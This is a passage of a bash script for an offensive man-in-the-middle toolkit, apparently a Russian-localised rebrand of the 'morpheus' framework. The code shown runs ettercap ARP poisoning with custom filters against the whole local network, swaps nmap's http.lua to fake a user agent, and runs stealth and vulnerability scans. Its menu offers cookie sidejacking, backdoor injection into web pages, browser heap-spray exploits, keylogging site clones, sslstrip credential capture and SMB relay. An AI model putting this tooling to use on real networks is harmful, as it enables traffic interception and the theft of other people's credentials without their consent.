  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "Фреймворк morpheus теперь дает вам\возможность просто запустить фильтр\ИЛИ для дальнейшего его скриптинга ...\n\n'Подробнее его написать'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/IG.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление IG.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/IG.eft -o $IPATH/output/IG.ef && sleep 3"
    sleep 1
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - сбор информации заголовка протокола HTTP" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -M ARP /// ///
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - сбор информации заголовка протокола HTTP" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -L $IPATH/logs/IG.log -M ARP /// ///
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - сбор информации заголовка протокола HTTP" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -M ARP // //
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - сбор информации заголовка протокола HTTP" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -L $IPATH/logs/IG.log -M ARP // //
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  sleep 2
  mv $IPATH/filters/IG.bak $IPATH/filters/IG.eft > /dev/null 2>&1
  rm $IPATH/output/ip.mop > /dev/null 2>&1
  rm $IPATH/output/IG.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}



# ------------------------------------------------
# NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
# ------------------------------------------------
sh_stageS () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Доступные предопределенные сканы nmap:                             ${BlueF}|"
echo "${BlueF}    | ${YellowF}    1º - Нормальный   -  nmap ip discovery                            ${BlueF}|"
echo "${BlueF}    | ${YellowF}    2º - хитрость  -  nmap syn/ack + OS detection                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}    3º - NSE      -  nmap service detection + nse-vuln categorie  ${BlueF}|"
echo "${BlueF}    | ${YellowF}    4º - цель   -  nmap sealth + nse-vuln categorie             ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


#
# Fake User_Agent funtion
#
if [ "$IPH_UA" = "YES" ]; then
    echo ${BlueF}[☠] Please wait, Replacing http.lua nmap lib ..${Reset};
    sleep 2
      # check if we are in the rigth path
      if [ -e $LUA_PATH/nselib/http.lua ]; then
        cp $LUA_PATH/nselib/http.lua $IPATH/output/http.lua > /dev/null 2>&1
        cp $IPATH/bin/http.lua $LUA_PATH/nselib/http.lua > /dev/null 2>&1
        nmap --script-updatedb > /dev/null 2>&1
      else
        echo ${RedF}[x]${white} http.lua NOT found under sellected path ..${Reset};
        echo ${RedF}[x]${white} edit [ settings ] and config [ LIB_PATH= ] ${Reset};
        sleep 1
        exit
      fi
fi

  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
  # grab ip range + scan with nmap + zenity display results
  IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} Ip Range${RedF}:${GreenF}$IP_RANGE ${Reset};

  #
  # agressive scan using nmap -sS -O (OS) pentesting tutorials idea ..
  #
  Tc=$(zenity --list --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выберите необходимый тип сканирования \Помните, который для "скрытого сканирования" занимает больше времени .." --radiolist --column "Pick" --column "Option" TRUE "Normal" FALSE "Stealth" FALSE "NSE" FALSE "Target" --width 300 --height 250) > /dev/null 2>&1


  #
  # scan local lan using nmap
  #
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} Scan sellected${RedF}:${GreenF}$Tc ${Reset};
  dtr=`date | awk {'print $4'}`
  sleep 1
  #
  # Fake User_Agent funtion
  #
  if [ "$IPH_UA" = "YES" ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Faking User_Agent${RedF}:${GreenF}IPhone${Reset};
  fi


  if [ "$Tc" = "Normal" ]; then
    nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="[ $dtr ] Scanning local lan [ Normal ].." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 480 --height 390 > /dev/null 2>&1

  elif [ "$Tc" = "Stealth" ]; then
    nmap -sS $IP_RANGE -O -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="[ $dtr ] Scanning local lan [ Stealth ] .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "#" | grep -v "CPE:"| grep -v "type:" | grep -v "Distance:" | grep -v "closed" | grep -v "Too" | grep -v "No" | grep -v "latency" | grep -v "incorrect" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470 > /dev/null 2>&1

  elif [ "$Tc" = "NSE" ]; then
    nmap -sV -T4 -Pn -oN $IPATH/logs/lan.mop --script vuln $IP_RANGE | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="[ $dtr ] Scanning local lan [ NSE ] .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470 > /dev/null 2>&1

  else

    target=$(zenity --title="☠ Enter  RHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
    nmap -sS -Pn --reason --data-length 25 -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470 > /dev/null 2>&1
  fi


    # cleanup
    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
    rm $IPATH/logs/lan.mop > /dev/null 2>&1
    sleep 2
    if [ "$IPH_UA" = "YES" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white} Reverting nmap http.lua lib ..${Reset};
      sleep 2
      mv $IPATH/output/http.lua $LUA_PATH/nselib/http.lua > /dev/null 2>&1
      nmap --script-updatedb > /dev/null 2>&1
    fi


else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# -------------------------
# FUNTION TO EXIT FRAMEWORK
# -------------------------
sh_exit () {
echo ${BlueF}[☠]${white} Exit morpheus framework...${Reset};
sleep 1
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
mv /tmp/etter.conf $Econ > /dev/null 2>&1
sleep 1
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.dns ${Reset};
mv /tmp/etter.dns $Edns > /dev/null 2>&1
sleep 1
mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
rm $ApachE/index.html > /dev/null 2>&1
sleep 2
clear
echo ${RedF}codename${white}::${RedF}oneiroi_phobetor'(The mithologic dream greek god)'${Reset};
echo ${RedF}Morpheus${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2018  ${Reset};
exit
}



sh_main () {
echo "nothing" > /dev/null 2>&1
}


Colors;
# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
echo "" && echo "${BlueF}                ☆${BlueF}"
cat << !
   ██████╗ ██████╗  ██████╗ ███╗   ███╗███████╗██████████╗██╗  ██╗███████╗██╗   ██╗███████╗
   ██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔════╝╚═══██╔═══╝██║  ██║██╔════╝██║   ██║██╔════╝
   ██████╔╝██████╔╝██║   ██║██╔████╔██║█████╗      ██║    ███████║█████╗  ██║   ██║███████╗
   ██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝      ██║    ██╔══██║██╔══╝  ██║   ██║╚════██║
   ██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║    ██║  ██║███████╗╚██████╔╝███████║
   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝

          Bednakov-Xack-Live  denisbednakov@gmail.com  http://github.com/bednakovdenis
!
sleep 1
echo ${BlueF}"    ВЕРСИЯ:${YellowF}$V3R${BlueF} ДИСТРИБУТИВ:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} ИНТЕРФЕЙС:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
cat << !
    ╔─────────────────────────────────────────────────────────────────────────────────────────╗
    |   1    -  Фильтр брандмауэра  (tcp/udp)          -                 report/capture_creds |
    |   2    -  Захватить печенье  (http/auth)         -                  sidejacking атака   |
    |   3    -  Отбросить все пакеты (src/dst)         -          packets падение/убийство    |
    |   4    -  Перенаправить трафик браузера          -                    в другой домен    |
    |   5    -  Перенаправить трафик браузера          -                     в гугл сферу     |
    |   6    -  Обнюхивать трафик браузера (http)      -                 visited url's        |
    |   7    -  Обнюхивать трафик браузера (http)      -             захватывать картинки     |
    |   8    -  Обнюхивать сообщения в чате   (live)   -                 AOL,IRC,YAHOO,MSN    |
    |   9    -  Внедрить бэкдор в (</body>)            -                 exe,bat,jar,ps1,dll  |
    |  10    -  Firefox браузер кучи-спрей             -             переполнение буфера      |
    |  11    -  Android-браузер кучи-спрей             -             переполнение буфера      |
    |  12    -  Tor-браузер кучи-спрей (windows)       -             переполнение буфера      |
    |  13    -  Клон веб-сайта + кейлогер              -                 javascritp_keylooger |
    |  14    -  Страница входа модема/маршрутизатора   -                 javascritp_keylooger |
    |  15    -  Заменить изображения на сайте          -                 img src=http://other |
    |  16    -  Заменить текст сайта                   -                 replace: worlds      |
    |  17    -  Устройства DHCP discovery              -    устройства модем аутентификации   |
    |  18    -  Блок ЦП криптовалюты                   -            отбросить/убить пакеты    |
    |  19    -  Перенаправить трафик браузера          -                          гуглить     |
    |  20    -  Захватить учетные данные https         -                 sslstrip+dns2proxy   |
    |  21    -  SMBrelay боковое движение              -              C & C SMBRelay эксплойт |
    |  22    -  сбор информации заголовка tcp          -           захватывать заголовки http |
    |                                                                                         |
    |   W    -  Напишите свой собственный фильтр                                              |
    |   S    -  Сканирование локальной сети на наличие хостов                                 |
    |   E    -  Выйти/закрыть CICADA3301                                                      |
    ╚─────────────────────────────────────────────────────────────────────────────────────────╣
!
echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2020 Bednakov-Xack-live${BlueF}_⌋${Reset}"
echo ${BlueF}[☠]${white} инструмент для захвата TCP / UDP${RedF}! ${Reset};
sleep 0.8
echo ${BlueF}[▶]${white} Выбери свой вариант[filter]${RedF}: ${Reset};
echo -n "$PrompT"
read choice
case $choice in
1) sh_stage1 ;;
2) sh_stage2 ;;
3) sh_stage3 ;;
4) sh_stage4 ;;
5) sh_stage5 ;;
6) sh_stage6 ;;
7) sh_stage7 ;;
8) sh_stage8 ;;
9) sh_stage9 ;;
10) sh_stage10 ;;
11) sh_stage11 ;;
12) sh_stage12 ;;
13) sh_stage13 ;;
14) sh_stage14 ;;
15) sh_stage15 ;;
16) sh_stage16 ;;
17) sh_stage17 ;;
18) sh_stage18 ;;
19) sh_stage19 ;;
20) sh_stage20 ;;
21) sh_stage21 ;;
22) sh_stage22 ;;
W) sh_stageW ;;
w) sh_stageW ;;
S) sh_stageS ;;
s) sh_stageS ;;
e) sh_exit ;;
E) sh_exit ;;
*) echo "\"$choice\": не является допустимым вариантом"; sleep 1.3 ;;
esac
done
